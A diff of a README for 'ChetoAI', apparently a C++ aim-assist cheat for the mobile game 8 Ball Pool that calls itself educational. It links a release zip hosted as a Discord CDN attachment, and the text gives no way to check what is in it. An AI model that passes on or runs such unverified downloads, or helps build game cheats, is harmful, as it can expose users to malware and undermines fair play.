@@ -1,6 +1,9 @@
 |[Download](https://cdn.discordapp.com/attachments/1443584758348120076/1443892215062462495/Release_v9.3.1.zip?ex=692ab8ea&is=6929676a&hm=f6089abe33e17e567639fbe8a3b5eff9ef5a17ade0c1c6372743d60f1610bf07&)
 |:------------- |
 
+![cheto-8-ball-pool-aim-master-apk-1](https://github.com/user-attachments/assets/1ceac396-1e4c-4a0c-a0b6-ede0348a3674)
+
+
 # ChetoAI - Level 1 (Extended Guidelines for 8 Ball Pool)
 
 ChetoAI is a C++ educational project that replicates **Cheto Aim Tool** features for the mobile game **8 Ball Pool**, beginning with **Level 1: Extended Guidelines** using object detection and physics simulation.
